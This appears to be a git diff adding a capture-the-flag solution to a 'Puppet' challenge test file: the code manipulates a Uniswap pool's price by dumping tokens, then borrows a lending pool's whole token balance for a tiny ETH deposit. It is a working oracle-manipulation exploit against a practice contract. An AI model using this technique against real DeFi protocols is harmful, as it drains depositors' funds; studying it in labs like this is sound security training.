@@ -83,6 +83,30 @@ describe("[Challenge] Puppet", function () {
 
   it("Exploit", async function () {
     /** CODE YOUR EXPLOIT HERE */
+    const logPrices = async () => {
+      const dvtPrice = await this.uniswapExchange.getTokenToEthInputPrice(ethers.utils.parseEther("1"), { gasLimit: 1e6 });
+      const ethPrice = await this.uniswapExchange.getEthToTokenInputPrice(ethers.utils.parseEther("1"), { gasLimit: 1e6 });
+
+      console.log("\tDVT Price:", ethers.utils.formatEther(dvtPrice));
+      console.log("\tETH Price:", ethers.utils.formatEther(ethPrice));
+    };
+
+    console.log("Pool prices:");
+    await logPrices();
+
+    // debalance pool prices by purchasing all the ETH available
+    console.log("Debalancing...");
+    const attackerDVT = await this.token.balanceOf(attacker.address);
+    this.token.connect(attacker).approve(this.uniswapExchange.address, attackerDVT);
+    await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(attackerDVT.sub(1), 1, (await ethers.provider.getBlock("latest")).timestamp + 60);
+
+    console.log("Pool prices:");
+    await logPrices();
+
+    // the needed deposit amount is less than the current attacker ETH balance
+    // so we can use that to borrow all the DVT amount in the lendingPool
+    const depositAmount = await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
+    await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE, { value: depositAmount });
   });
 
   after(async function () {
